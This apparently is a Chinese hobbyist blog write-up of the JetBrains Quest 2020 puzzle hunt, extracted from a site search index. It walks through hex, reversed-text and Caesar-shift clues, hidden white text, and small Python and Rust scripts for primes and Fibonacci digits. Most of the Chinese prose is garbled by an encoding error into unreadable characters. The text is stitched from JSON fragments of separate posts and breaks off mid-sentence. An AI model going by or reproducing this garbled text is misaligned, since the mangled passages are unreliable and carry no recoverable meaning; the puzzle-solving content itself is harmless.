the first episode of the PhpStorm EAP. If we gave you a clue, it would be easy as pi. å…³é”®è¯ï¼švideoï¼ŒPhpStorm EAPï¼Œpiã€‚ ç›²çŒœå°±ä¸ 3.14/3.1415926 ä¹‹ç±»çš„æœ‰å…³ã€‚ Step 4æœç´¢ PhpStorm EAPï¼Œæ¥åˆ°äº†ä»–çš„ç½‘ç«™ã€‚ å™¢è¿™æ˜¯ä¸ª PHP çš„ IDE å•Šã€‚EAP ç›¸å½“äºé¢„å‘å¸ƒç‰ˆæœ¬ï¼Ÿ PhpStorm Early Access Program At JetBrains, we believe that to make great tools for developers, we should listen to and involve developers. Our Early Access Program (EAP) lets our development community participate in the product discussions and influence development planning, from the very early stages. åœ¨é¡µé¢ä¸Šæ²¡æœ‰æ‰¾åˆ° questï¼Œä¹Ÿæ²¡æ‰¾åˆ°è§†é¢‘åŠå…¶é“¾æ¥ï¼Œçœ‹äº†ä¸€ä¸‹æœ€æ–°çš„ç‰ˆæœ¬æ˜¯ 2020.1 EAP build 201.6251.26 Released: March 12, 2020ã€‚ çœ‹äº†ä¸€ä¸‹ Blog &amp; Socialï¼Œæ¥åˆ° PHPSTORM çš„ blogï¼Œçœ‹åˆ°äº†æœ€æ–°ç‰ˆæœ¬å‘å¸ƒçš„ Postã€‚ å¥½äº†ï¼Œæœ‰è§†é¢‘é“¾æ¥äº†ï¼Whatâ€™s Coming in PhpStorm 2020.1 åœ¨ Whatâ€™s Coming in PhpStorm 2020.1 â€“ EAP Series | Season 2020.1 Episode 1 è¿™ä¸ªè§†é¢‘é‡Œï¼Œé‡ç‚¹å…³æ³¨ PI å³ 3â€™14â€™â€™ é™„è¿‘çš„å†…å®¹ã€‚ å‘ç°ç”»é¢æŠ–åŠ¨äº†ä¸¤ä¸‹ emmm æœ‰çŒ«è…»ï¼ çŒœæƒ³çº¿ç´¢è—åœ¨æŠ–åŠ¨çš„ä½ç½®ï¼Œç„¶è€Œçœ‹äº†å‡ éï¼Œç”šè‡³å¼€åˆ°æœ€æ…¢çš„ 0.25 å€é€Ÿï¼Œéƒ½æ²¡çœ‹å‡ºæ¥ emmmï¼ˆå¥½èœå•Š äºæ˜¯æ‰¾äº†ä¸ªå·¥å…·æŠŠè¿™ä¸ªè§†é¢‘ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾ Premiere é‡Œé€å¸§çœ‹ã€‚ è£å‰ªäº†ï¼Œæ”¾å¤§å†çœ‹è¿™1ç§’å¤šçš„ç‰‡æ®µã€‚æœ€åå‘ç° homepage è¿™é‡Œå‘ç”Ÿäº†å˜åŒ–ã€‚ åŸæ¥ä»–çš„æ„æ€æ˜¯ clue åœ¨è¿™ä¸¤æ®µæŠ–åŠ¨ä¹‹é—´å•Šï¼ äºæ˜¯å¾—åˆ°ä¸‹ä¸€ä¸ªé“¾æ¥ï¼šhttps://jb.gg/31415926 çš„ç¡®ä¸ PI æœ‰å…³å‘¢ï¼ˆ æœ‰æ„æ€çš„æ˜¯ï¼Œè¿™ä¸ªè§†é¢‘2æœˆ10æ—¥å°±å‘å¸ƒäº†ï¼ŒçœŸæ˜¯è“„è°‹å·²ä¹…å•Š 233333. çœ‹è¯„è®ºåŒºè¿˜æœ‰äººä¸€ä¸ªæœˆå‰ç–‘æƒ‘å‘¢ã€‚ Step 5è®¿é—® https://jb.gg/31415926 301è·³è½¬åˆ° https://www.quiz-maker.com/Q2723CE ï¼ˆå‘ç°è¿™ä¸ª www.quiz-maker.com æ˜¯ä¸ªæŒºä¸é”™çš„åœ¨çº¿ quiz ç½‘ç«™å‘¢ The Easiest #1 Rated Online Quiz Maker Publish your quiz in a matter of minutes. Go ahead Try it now! ç„¶åéœ€è¦ä½ åœ¨ 1min å†…å›ç­”å…³äº JB çš„ä¸€äº›é—®é¢˜ã€‚ ï¼ˆçœŸæŒºå¥½ï¼Œé¡ºä¾¿å®£ä¼ ä¸€ä¸‹è‡ªå·±ã€‚ åšä¸å¯¹å†é‡æ¥ï¼Œç„¶åå‘ç°æ¯æ¬¡è¿˜æœ‰æ–°çš„é¢˜ç›®ï¼ˆé»‘è„¸ ç„¶åæˆ‘åšäº†å¥½å¤šæ¬¡ï¼Œå‘ç°è°·æ­Œæœç´¢çš„ ç²¾é€‰æ‘˜è¦ çœŸçš„å¥½ç”¨ã€‚ æœ€åç»ˆäºå…¨å¯¹äº†ã€‚ Almost there! The last challenge is in the Tips of the Day of a specific IntelliJ IDEA Community version from our latest build page in Confluence, butâ€¦ there is a catch. You have to know which version to look for. To find the build number, you need sight beyond sight: . Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything. çœ‹æ¥ä¸ Tips of the Day of a specific IntelliJ IDEA Community version æœ‰å…³ï¼Œè—åœ¨æ¯æ—¥æç¤ºé‡Œå¯è¿˜è¡Œï¼Œè€Œä¸”è¿˜æ˜¯ä¸€ä¸ªç¥ç§˜çš„ç‰ˆæœ¬ã€‚è¿™ä¸ªç‰ˆæœ¬éƒ¨ç½²åœ¨ Confluence ä¸Šé¢ã€‚ ä¸‹é¢è¿™æ®µè¯æœ‰ç‚¹æ‘¸ä¸ç€å¤´è„‘ã€‚ ä¸ç®¡äº†å…ˆå» IDEA ç½‘ç«™ä¸Šçœ‹çœ‹ï¼Œéš¾é“é¡ºä¾¿éª—ä¸€æ³¢ä¸‹è½½é‡ï¼Ÿï¼Ÿï¼Ÿ Step 6è®¿é—® IDEA å®˜ç½‘ï¼Œé¡ºç€ Release Notesï¼Œæ¥åˆ°äº†è¿™é‡Œã€‚ ç¬¬ä¸€ä¸ªå°±æ˜¯å§ã€‚è¿˜æ˜¯å‡ ä¸ªå°æ—¶å‰åˆšå‘å¸ƒçš„å‘¢ï¼ å°±æ˜¯è¿™ä¸ªï¼šIDEA 2020.1 Quest Build Edition ä¸‹è½½ä¸‹æ¥è€Œåå®‰è£…ã€‚ä»€ä¹ˆï¼Œ1.4GBï¼Ÿï¼Ÿï¼Ÿ éšä¾¿äº†éšä¾¿äº†ï¼Œè£…å®Œå¸æ‰å¥½äº†ã€‚ï¼ˆä¸è¿‡å¬è¯´ç”¨æ¥å†™ Java æŒºå¥½ç”¨çš„ ï¼ˆä¼°è®¡è¿™é‡Œè¿˜èƒ½å¼•ä¸€æ³¢æµå‘¢ Step 7è£…å¥½äº†éšæ„å»ºä¸€ä¸ªé¡¹ç›®ï¼Œå”¤å‡º Tip of the Day. ç¿»äº†å‡ é¡µä¹‹åæ‰¾åˆ°äº†ã€‚ JETBRAINS QUEST: LAST PUZZLE You have discovered our JetBrains Quest! If you donâ€™t know what this is, you should start from the beginning. This is it. The last puzzle. You are just one step away from glory!Now you just need the Key to unlock the Quest page.The Key is the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million)).As you may know by now, not all that glitters is gold, and to solve this puzzle you should not go straight for the obvious answer. May you make a glorious choice. Remember that you have until the 15th of March 12:00 CEST. æ‰€ä»¥è¿™é‡Œè¦æ‰¾åˆ° the first and last 4 digits of the 50 * 10^6 position of the Fibonacci sequence (F(50 Million)) å³ Fibonacci æ•°åˆ— 50Ã—10^6 ä½ç½®çš„å‰4ä½å’Œå4ä½ã€‚ Quest Page å°±æ˜¯ä¹‹å‰çš„ https://www.jetbrains.com/promo/quest/ Beat the Questé‚£å°±ç®—å§ï¼Œå‰å››ä½å¥½ç®—ï¼Œåå››ä½æœ‰ç‚¹éš¾é¡¶ã€‚ æœäº†ä¸€ä¸‹Googleå‘ç°å‡ºä¸æ¥ã€‚ ä¸è¿‡æ‡’å¾—æ‰‹æ’¸ä»£ç ç®—äº†ï¼Œç›´æ¥æ‰¾ wolframalpha å§ï¼ å‰å››ä½æ˜¯4602ã€‚åå››ä½çš„è¯ï¼Œmod 10000å‡ºç»“æœã€‚ å¾—åˆ°åå››ä½ä¸º3125ã€‚ äºæ˜¯ Code å°±æ˜¯ 46023125å•¦ï¼ æ‰€ä»¥æœ€ç»ˆå¾—åˆ°çš„æ˜¯ JB å®¶å…¨å®¶æ¡¶å…«æŠ˜åˆ¸ emmmm ï¼ˆè¿˜ä»¥ä¸ºæ˜¯å…­ä¸ªæœˆæˆæƒå‡‘æˆä¸€å¹´çš„å‘¢ ä¸ç®¡äº†ï¼Œåæ­£æœ¬æ¥å°±æœ‰æ•™è‚²æˆæƒä¸å·®è¿™ä¸ªï¼ˆ å¥½ç©å°±è¡Œäº† 23333 å¦‚æœä½ éœ€è¦çš„è¯ï¼ŒRemember that you have until the 15th of March 12:00 CEST. å†çœ‹ Step 5 ä¸­çš„ Clueæœ¬æ¥æœ¬æ–‡åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œç„¶åæƒ³èµ·æ¥ä¹‹å‰çš„ clue æœ‰ç‚¹æƒ³ä¸é€šï¼Œå†æ¥çœ‹çœ‹ã€‚ . Not Everything Today Does All You Could Ask. Lessons Learned From Other Relevant Solutions, Possibly Even Another Kind Emerge. Risking Sometimes Being Liberal Or Generous Proves Ordinary Simple Tests Infinitely More Annoying. Get Examining Hidden Initial Designated Early Symbols. They Have Everything Needed, Except Xerox, To Completely Level Up Everything. çœ‹äº†ä¸€äº› V2EX ä¸Šçš„è®¨è®ºï¼Œå‘ç°åªçœ‹é¦–å­—æ¯å¯ä»¥æ‹¼å‡ºä¸€å¥è¯ã€‚ .net day call for speakers blog post image hides the next clue æœäº†ä¸€ä¸‹ï¼Œæ¥åˆ°äº†è¿™é‡Œã€‚ JetBrains .NET Day Online 2020 â€“ Call for Speakers åœ¨è¿™å¼ å›¾ç‰‡è¿™é‡Œæ‰¾åˆ°äº†çº¿ç´¢ã€‚ï¼ˆå™— you_are_looking_for_build_201-6303 ä¸è¿‡é—®é¢˜ä¸å¤§2333. åæ­£ä¹Ÿæ‰¾åˆ°äº†å‘¢ã€‚ Extensive Readingå†çœ‹äº†çœ‹å¤§ä½¬ä»¬çš„è®¨è®ºï¼Œå‘ç°æœ‰å¤§ä½¬ç”¨ rust å†™äº†ä¸ª jioæœ¬ ç®—å‡ºäº†åå››ä½ã€‚ fn main() { let mut a2: u128 = 1; let mut a1: u128 = 1; for i in 3..=50000000 { //for i in 3..=50 { let new = a2 + a1; a2 = a1; if new &gt; 10000 { a1 = new % 10000; } else { a1 = new; } if i % 10000 == 0 { print!(\"\\r[{}]\", i); } } println!(\"\\nok: {}\", a1); } ä»–çš„æ€è·¯æ˜¯ï¼š åå››ä½æˆ‘è‡ªå·±å†™ç¨‹åºè·‘ï¼Œè¶…è¿‡å››ä½æ•°å°±å‡æ‰ä¸€ä¸‡ï¼Œç­‰äºåªç®—æœ€åå››ä½ã€‚ è¿˜æœ‰å¤§ä½¬å‘ç°äº† Fib æ•°åˆ—æ˜¯æœ‰è§„å¾‹çš„â†“ã€‚ http://www.maths.surrey.ac.uk/hosted-sites/R.Knott/Fibonacci/fibmaths.html#section1.1 etc. é¢˜å¤–è¯ä»Šå¤©æ˜¯ PI æ—¥ï¼ŒèŠ‚æ—¥å¿«ä¹å‘€ï¼ æœ€è¿‘å¯¹åšå®¢è¿›è¡Œäº†ä¸€äº›ä¼˜åŒ–ï¼Œæˆ–è€…è¯´æ˜¯é™¤è‰äº†ï¼Œæ‡’å¾—å¼€æ–°æ–‡ç« å†™äº†ã€‚ ä¸»è¦è®©å¸¸ç”¨çš„ JavaScriptã€CSSã€ä¸€äº›èƒŒæ™¯å›¾ç‰‡èµ° jsdelivr çš„ cdnï¼Œä¼˜åŒ–ä¸€ç‚¹åŠ è½½é€Ÿåº¦ã€‚ ç„¶åä¿®æ”¹äº† hexo çš„ feed æ’ä»¶ï¼ŒæŠŠ RSS ä¸­çš„ summary ä¼˜åŒ–ä¸ºäº†æ–‡ç« çš„æ‘˜è¦ï¼ˆåŸæ¥æ˜¯æˆªå–å…¨æ–‡æœ€å¼€å§‹çš„ä¸€éƒ¨åˆ†æ–‡å­—ï¼Œè¿˜ä¿ç•™ç€ä¸€å †æ ‡ç­¾ï¼Œä¸‘æ­»äº†ï¼‰ã€‚æœŸé—´è¿˜å‘ç°æŠ¥é”™äº†ï¼Œåæ¥å» Github å‚è€ƒäº†å¤§ä½¬ä»¬æ›´æ–°çš„æºç æ”¹äº†ä¸€ä¸‹æ¨¡æ¿ã€‚ è¿™æ · RSS çš„æ•ˆæœå°±å¥½å¤šäº†ã€‚ æ¬¢è¿å¤§ä½¬ä»¬å…³æ³¨ï¼Œå’Œæˆ‘äº¤æ¢å‹é“¾å‘€ï¼ RSS åœ°å€ï¼šhttps://miaotony.xyz/atom.xml ï¼ˆæ„Ÿè§‰è¶Šå†™è¶Šæ°´äº† ï¼ˆæºœäº†æºœäº†","path":"2020/03/14/CTF_2020JetBrainsQuest3/"},{"title":"CTF | JetBrains Quest 1&2 WriteUp/æ”»ç•¥","text":"å‰è¨€æ˜¨æ™šåœ¨ Telegram é‡Œçœ‹åˆ°æœ‹å‹å‘äº†ä¸€ä¸ª JetBrains Quest çš„ twitter é“¾æ¥ï¼Œæ®è¯´éš¾åº¦ä¸å¤§ï¼Œè¿˜å¯ä»¥ç™½å«–ä»–å®¶çš„äº§å“æˆæƒã€‚ æ„Ÿå…´è¶£å°±æ¥ä½“éªŒä¸€ä¸‹å§ï¼ äºæ˜¯ä½“éªŒäº† Quest1 å’Œ 2 ç™½å«–äº† 3+3 ä¸ªæœˆçš„ JB å®¶å…¨äº§å“æˆæƒï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹é€šå…³è¿‡ç¨‹ï¼Œä¹Ÿç®—æ˜¯æ”»ç•¥ / WriteUp å§ã€‚ æ„Ÿè§‰ä¹Ÿæ˜¯ CTF, Capture The Flag çš„èŒƒç•´å§ï¼Œæš‚ä¸”å°±å½’ç±»ä¸º CTF å¥½äº†ï¼ˆ æ¬¢è¿æ¥å’Œæˆ‘äº¤æµå“ˆã€‚ PAY ATTENTION! æ³¨æ„ï¼ å¦‚æœæ²¡æœ‰ç©è¿‡çš„è¯ æœ¬æ–‡ä¸‹é¢çš„å†…å®¹ å…¨ æ˜¯ å‰§ é€ï¼ å¦‚æœæƒ³è‡ªå·±åšçš„è¯ï¼Œå°±æš‚æ—¶ä¸è¦å¾€ä¸‹çœ‹äº†ï¼ è¿™ä¸ª Quest åœ¨ 2020-03-15 12:00 CET ï¼ˆæ¬§æ´²ä¸­éƒ¨æ—¶é—´ï¼‰ä¹‹å‰éƒ½æœ‰æ•ˆã€‚ Quest 1https://twitter.com/jetbrains/status/1236986174075482113 48 61 76 65 20 79 6f 75 20 73 65 65 6e 20 74 68 65 20 73 6f 75 72 63 65 20 63 6f 64 65 20 6f 66 20 74 68 65 20 4a 65 74 42 72 61 69 6e 73 20 77 65 62 73 69 74 65 3f ä¸€çœ‹æ˜¯ hexï¼Œäºæ˜¯è½¬æˆ ASCIIï¼Œå¾—åˆ°ï¼š Have you seen the source code of the JetBrains website? Step 1å»å®˜ç½‘ä¸Šæ‰¾å‘—ã€‚ä¼ é€é—¨ï¼šhttps://www.jetbrains.com/ ï¼ˆè¿˜åˆ«è¯´ï¼ŒæŒºä¹…æ²¡ä¸Š JetBrains å®˜ç½‘äº†ï¼Œæ„Ÿè§‰åˆå¤šäº†ä¸å°‘å·¥å…·ï¼Œç•Œé¢ä¹Ÿå˜å¾—æ›´å¥½çœ‹äº†å”‰ã€‚ æç¤ºäº†çœ‹æºç ï¼Œæ—¢ç„¶æ˜¯ JetBrainsQuest äº†ï¼Œå½“ç„¶å°±**æœä¸€ä¸‹quest**ã€‚ æœç„¶çœ‹åˆ°äº†æç¤ºã€‚ &lt;!-- O {o)xxx|===============- O Welcome to the JetBrains Quest. What awaits ahead is a series of challenges. Each one will require a little initiative, a little thinking, and a whole lot of JetBrains to get to the end. Cheating is allowed and in some places encouraged. You have until the 15th of March at 12:00 CET to finish all the quests. Getting to the end of each quest will earn you a reward. Let the quest commence! JetBrains has a lot of products, but there is one that looks like a joke on our Products page, you should start there... (hint: use Chrome Incognito mode) Itâ€™s dangerous to go alone take this key: Good luck! == Jrrg#oxfn$ O -===============|xxx(o} O --&gt; è¿™é‡Œæç¤ºäº†hint: use Chrome Incognito modeã€‚ å»ºè®®ç”¨ Chrome çš„æ— ç—•æ¨¡å¼ã€‚ Step 2äºæ˜¯å°±å» products é‡Œæ‰¾äº†å‘—ã€‚ ï¼ˆå¯èƒ½æ²¡æ³¨æ„ï¼‰æ²¡æ‰¾åˆ°å…¥å£ï¼Œç›²çŒœå°±åœ¨ /products ç›®å½•äº†ï¼Œè®¿é—®åè·³è½¬åˆ°äº† https://www.jetbrains.com/products.html ã€‚ åæ¥å‘ç°ä¸»é¡µä¸Šçš„é“¾æ¥åœ¨ See All Tools é‡Œï¼ˆ æ‰¾æ‰¾å“ªä¸ªlooks like a jokeï¼Œä¸€çŒœå°±æ˜¯ JK äº†ï¼Œè€Œä¸”è¿˜æ˜¯2020.1.1ç‰ˆæœ¬ï¼ˆå˜»å˜» ã€‚ åæ¥å‘ç°ï¼ŒJK è¿™ä¸ªäº§å“å¯èƒ½éœ€è¦åœ¨ æ— ç—•æ¨¡å¼/éšç§æ¨¡å¼ ä¸‹æ‰å‡ºç°ã€‚ï¼ˆæœ‰å¯èƒ½æœ‰ç¼“å­˜ï¼Ÿ åé¢å†æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæ€ä¹ˆåŠ è½½å‡ºæ¥çš„8. Step 3æ‰¾ä¸€ä¸‹ 500 åˆ° 5000 ä¹‹å†…æœ‰å¤šå°‘ç´ æ•°ï¼Œéšæ‰‹å†™ä¸ª py çš„ jio æœ¬ã€‚ ï¼ˆè¾¹ç•Œå€¼çš„è¯ï¼Œ5000è‚¯å®šä¸æ˜¯ç´ æ•°ï¼Œä¸å½±å“ç»“æœ from math import sqrt cnt = 0 for i in range(500, 5000): for j in range(2, int(sqrt(i))+1): if i % j == 0: break if j == int(sqrt(i)): cnt += 1 print('OK!') print(cnt) è·‘å‡ºæ¥ cnt ä¸º 574. äºæ˜¯è®¿é—® https://jb.gg/574 .ï¼ˆä¸è¾“å…¥çš„è¯æ˜¯è·³è½¬åˆ°å®˜ç½‘çš„ ï¼ˆå…¶å®çˆ†ç ´ä¹Ÿè¡Œï¼Œåæ­£å°±ä¸‰ä½æ•°å‘¢ å‘ç° 301 é‡å®šå‘åˆ°äº† https://www.jetbrains.com/help/pycharm/getting-help.html#quest ã€‚ Step 4Google ä¸Šä¸€æœå°±æ˜¯äº†ã€‚ ï¼ˆä¸‹é¢è¿˜æœ‰ V2EX ä¸Šåˆ«äººçš„è®¨è®º ï¼ˆï¼ˆä¸çœ‹ä¸çœ‹å…ˆä¸çœ‹ï¼ https://youtrack.jetbrains.com/issue/MPS-31816 è¿™æ˜¯ YouTrack çš„ä¸€ä¸ª issueã€‚ï¼ˆè¿™é‡Œç›´æ¥è°·æ­Œå¯èƒ½æ˜¯éé¢„æœŸè§£äº† JetBrains Quest â€œThe key is to think back to the beginning.â€ â€“ The JetBrains Quest team Qlfh$#Li#|rx#duh#uhdglqj#wklv#|rx#pxvw#kdyh#zrunhg#rxw#krz#wr#ghfu|sw#lw1#Wklv#lv#rxu#lvvxh#wudfnhu#ghvljqhg#iru#djloh#whdpv1#Lw#lv#iuhh#iru#xs#wr#6#xvhuv#lq#Forxg#dqg#iru#43#xvhuv#lq#Vwdqgdorqh/#vr#li#|rx#zdqw#wr#jlyh#lw#d#jr#lq#|rxu#whdp#wkhq#zh#wrwdoo|#uhfrpphqg#lw1#|rx#kdyh#ilqlvkhg#wkh#iluvw#Txhvw/#qrz#lwâ€œv#wlph#wr#uhghhp#|rxu#iluvw#sul}h1#Wkh#frgh#iru#wkh#iluvw#txhvw#lv#â€ŸWkhGulyhWrGhyhorsâ€ 1#Jr#wr#wkh#Txhvw#Sdjh#dqg#xvh#wkh#frgh#wr#fodlp#|rxu#sul}h1#kwwsv=22zzz1mhweudlqv1frp2surpr2txhvw2 ç»“åˆ Step1 ä¸­çš„ Good luck! == Jrrg#oxfn$ï¼Œåˆ†æå¯çŸ¥æ˜¯å¾€åç§»äº†3ä¸ªå­—ç¬¦ï¼ˆSHIFT3ï¼‰ã€‚ äºæ˜¯å…¨éƒ¨å¾€å‰ç§»3ä¸ªå­—ç¬¦å¾—åˆ°ï¼š Nice! If you are reading this you must have worked out how to decrypt it. This is our issue tracker designed for agile teams. It is free for up to 3 users in Cloud and for 10 users in Standalone, so if you want to give it a go in your team then we totally recommend it. you have finished the first Quest, now itâ€¦s time to redeem your first prize. The code for the first quest is &lt;TheDriveToDevelop&lt;. Go to the Quest Page and use the code to claim your prize. https://www.jetbrains.com/promo/quest/ Beat The QuestRuaï¼å“‡å¥½è€¶ï¼ TheDriveToDevelop ç„¶åå°±å¯ä»¥æ‹¿ç€è¿™ä¸ª code å»ç™½å«–å…è´¹æˆæƒäº†ï¼ è¾“å…¥é‚®ç®±å’Œä¸Šé¢çš„ Codeï¼Œæäº¤å°±å¥½å•¦ã€‚ è¿™é‡Œçœ‹åˆ° Twitter ä¸Šæœ‰äººè¯´ Firefox ä¼šæŠ¥ CORS issueï¼Œè¯·ä½¿ç”¨ Chrome è¯•è¯•ã€‚ (An error occurred while â€¦ è¿™é‡Œè¯´äº†ä¼šæŠŠä½ çš„ä¿¡æ¯æä¾›ç»™ä»–ï¼Œä»–ä¼šç»™ä½ çš„é‚®ç®±å‘æ¨èä¿¡æ¯ï¼Œå¯èƒ½è¿™æ˜¯ JetBrains å¸æ”¶æµé‡çš„ä¸€ä¸ªæ‰‹æ®µå§ï¼ˆç›²çŒœçš„ ä¸è¿‡ä»–ä¹Ÿè¯´äº†åœ¨é‚®ä»¶æœ«å°¾å¯ä»¥å–æ¶ˆè®¢é˜…ã€‚ BTWï¼Œå‘ç°è¿™é‡Œçš„ Code å¹¶æ²¡æœ‰ä¸Šä¼ åˆ°åç«¯è¿›è¡Œæ ¡éªŒï¼Œè€Œæ˜¯ç›´æ¥åœ¨å‰ç«¯è¿›è¡Œçš„ã€‚ å¯ä»¥ç»™ Code è¾“å…¥æ¡†çš„ input æ‰“ä¸ªæ–­ç‚¹çœ‹çœ‹ï¼ˆ ï¼ˆæˆ–è€…çœ‹çœ‹æäº¤è¡¨æ ¼çš„ call stack å¥½äº† äºæ˜¯å¾—åˆ°äº†ç™½å«–çš„ 3-months free All Products Pack subscriptionã€‚ æœ‰ç‚¹æ„æ€å”‰~ ç­‰ç­‰ï¼Ÿè¿˜æ²¡å®Œå”‰ï¼ è¿™æ˜¯ä¸€ç³»åˆ—çš„ Questï¼ ä¸‹ä¸€ä¸ª quest çš„æ—¶é—´æ˜¯1583924400ï¼Œè½¬æ¢æ—¶é—´æˆ³å‘ç°æ˜¯ 2020-03-11 19:00:00. Step2 ä¸­ JK çš„åŠ è½½åˆ†æçªç„¶æœ‰ç‚¹å¥½å¥‡è¿™ä¸ª JK æ˜¯æ€ä¹ˆè¢«åŠ è½½å‡ºæ¥çš„ï¼Œäºæ˜¯ç®€å•åˆ†æä¸€ä¸‹å§ã€‚ è¿™é‡Œæœç´¢questï¼Œåœ¨ç½‘é¡µæœ«å°¾å¤„çœ‹åˆ°äº†ä¸€ä¸ªåŠ è½½çš„dialog-polyfill.jsã€‚ åœ¨ Sources é‡Œè¿™ä¸ªæ–‡ä»¶é‡Œæœç´¢ JKæˆ–è€…questï¼Œéƒ½æ‰¾ä¸åˆ°ç½‘é¡µä¸Šä¸ JK æœ‰å…³ä¿¡æ¯ï¼Œå€’æ˜¯å®šä¹‰äº†ä¸€å †ç›¸å…³çš„å±æ€§æ–¹æ³•ä¹‹ç±»çš„ï¼Œcss æ–‡ä»¶ä¸­æ˜¯dialogæ¡†çš„ç›¸å…³æ ·å¼ã€‚ åœ¨ Network é‡Œçœ‹ products.html çš„ responseï¼Œé‡Œé¢å¹¶æ²¡æœ‰ JKï¼Œä¹Ÿæ²¡æœ‰questã€‚å°±è¿ä¸Šé¢è¿™ä¸ªè„šæœ¬æ–‡ä»¶ä¹Ÿæ²¡æœ‰ã€‚ é‚£è¿™ä¸ª JK åˆ°åº•æ˜¯æ€ä¹ˆåŠ è½½å‡ºæ¥çš„å‘¢ï¼Ÿ äºæ˜¯**åœ¨ Network é‡Œå…¨å±€æœç´¢äº†ä¸€ä¸‹ quest**ï¼Œæœ‰äº†æ–°çš„æ”¶è·ã€‚ åŸæ¥è¿™äº›ä¿¡æ¯éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªJSè„šæœ¬æ¥åŠ è½½çš„ã€‚ è¿™ä¸ª js çš„ response åŒ…å«äº†é¡µé¢ä¸Šçš„æ‰€æœ‰äº§å“ä¿¡æ¯ï¼Œæ˜¯æŠŠç½‘é¡µå†…å®¹åµŒå…¥åˆ° json é‡Œè¿›è¡Œæ•°æ®äº¤äº’çš„ã€‚ å“‡ï¼Œç¬¬ä¸€æ¬¡è§å”‰ï¼ğŸ˜‚ å†çœ‹ä¸€ä¸‹ Initiatorï¼Œå‘ç°è°ƒç”¨äº† Googletagmanagerï¼Œè¿™æ˜¯ä»€ä¹ˆä¸œè¥¿å”‰ï¼Œä¹‹å‰çˆ¬è™«è™«ä¹Ÿæ²¡é‡åˆ°è¿‡ï¼ˆåˆæ˜¯æˆ‘çŸ¥è¯†ç›²åŒºäº† æŸ¥äº†ä¸€ä¸‹ï¼Œæ˜¯è°·æ­Œçš„æ ‡ç­¾ç®¡ç†å™¨ï¼Œéƒ½è¯ç”ŸæŒºä¹…äº†ç„¶è€Œå¹¶ä¸çŸ¥é“ã€‚ Google Tag Manager helps make website tag management simple with tools &amp; solutions that allow small businesses to deploy and edit tags all in one place. è¿™é‡Œæ˜¯ä»–çš„å®˜ç½‘ã€‚ ä¸Šå»çœ‹äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰å°±æ˜¯å¯ä»¥åŠ¨æ€ä¿®æ”¹å‰ç«¯çš„ä»£ç ï¼Œä¸ç”¨ç›´æ¥ä¿®æ”¹åŸæœ¬çš„ç½‘ç«™æ–‡ä»¶ï¼Œä¸éœ€è¦é‡æ–°éƒ¨ç½²ã€‚è€Œä¸”è¿˜è‡ªå¸¦ç‰ˆæœ¬ç®¡ç†ï¼Œå¯ä»¥å¤šäººåˆä½œä¹‹ç±»çš„å§ã€‚ è°·æ­Œçš„ç»Ÿè®¡ä¹Ÿæ˜¯ç”¨è¿™ä¸ªæ¥å®ç°çš„ã€‚ ä¸è¿‡æœ‰ä¸ªç¼ºç‚¹æ˜¯ï¼Œå›½å†…è®¿é—®æ¯”è¾ƒæ…¢è€Œä¸”è¯´ä¸å®šå“ªå¤©å°±è¿æ¥ä¸ä¸Šäº†ã€‚ emmm åé¢æœ‰ç©ºæ„Ÿå…´è¶£å†æŠ˜è…¾å§ï¼ˆ Quest 2æ¥äº†æ¥äº†ï¼ç¬¬äºŒä¸ª Quest æ¥äº†ï¼ https://twitter.com/jetbrains/status/1237694815283879943 .spleh A+lrtC/dmC .thgis fo tuo si ti semitemos ,etihw si txet nehw sa drah kooL .tseretni wohs dluohs uoy ecalp a si ,dessecorp si xat hctuD erehw esac ehT .sedih tseuq fo txen eht erehw si ,deificeps era segaugnal cificeps-niamod tcudorp ehT å¾ˆæ˜æ˜¾å€’å™äº†ï¼Œè¿™é‡Œåè¿‡æ¥å¾—åˆ°ï¼š The product domain-specific languages are specified, is where the next of quest hides. The case where Dutch tax is processed, is a place you should show interest. Look hard as when text is white, sometimes it is out of sight. Cmd/Ctrl+A helps. æç¤ºäº†æ˜¯ä¸ªä¸ domain-specific languagesæœ‰å…³çš„äº§å“ï¼Œquestç›¸å…³çš„æ–‡å­—è®¾ç½®ä¸ºç™½è‰²çš„äº†ã€‚ Step 1è°·æ­Œæœä¸€ä¸‹ï¼Œç›´æ¥å°±å¾—åˆ°äº† JetBrains å®¶çš„ MPS (MetaProgrammingSystem) ï¼ˆä¹‹å‰ä¹Ÿæ²¡äº†è§£è¿‡ è®¿é—®å®ƒçš„å®˜ç½‘å§ï¼Œä¼ é€å–µï¼šhttps://www.jetbrains.com/mps/ Step 2åœ¨ç½‘é¡µé‡ŒåŒæ ·æœä¸€ä¸‹ quest å‘ç°æœ‰ä¸ª PDF æ–‡ä»¶å”‰~ æ‰“å¼€æ¥çœ‹çœ‹å§ï¼ Step 3äºæ˜¯ç»§ç»­åœ¨ PDF é‡Œæœç´¢questã€‚ å‘ç°æœç„¶æ˜¯ç™½è‰²çš„æ–‡å­—23333. Ctrl + A ï¼ŒCtrl + C / Vï¼Œçœ‹ä¸€ä¸‹é‚£ä¸€å—çš„æ–‡å­— This is our 20th year as a company, we have shared numbers in our JetBrains Annual report, sharing the section with 18,650 numbers will progress your quest Step 4ä¸Šé¢æç¤ºäº†JB 20å‘¨å¹´å¹´åº¦æŠ¥å‘Šï¼Œæƒ³èµ·æ¥å®˜ç½‘é¦–é¡µä¸Šæœ‰ä¸ªé“¾æ¥æ¥ç€ã€‚ https://www.jetbrains.com/company/annualreport/2019/ æ’å‡ å¥é¢˜å¤–è¯ã€‚ å°±æ˜¯ä¸ªå¹´æŠ¥å§ï¼Œçœ‹ä¸Šå» JB çš„ç¡®æŒºå—æ¬¢è¿å“’ï¼ï¼ˆPyCharm çœŸæŒºå¥½ç”¨çš„ ä¸‹é¢è¿™ä¸ªè§†é¢‘å°é¢çš„å°é»„é¸­è®©æˆ‘æƒ³åˆ°äº† å°é»„é¸­è°ƒè¯•æ³• 23333 ï¼ˆè¿™ä¸ª Dogfooding ç”¨çš„æœ‰ç‚¹æ„æ€ è¿™å›å†æ¥æœç´¢ 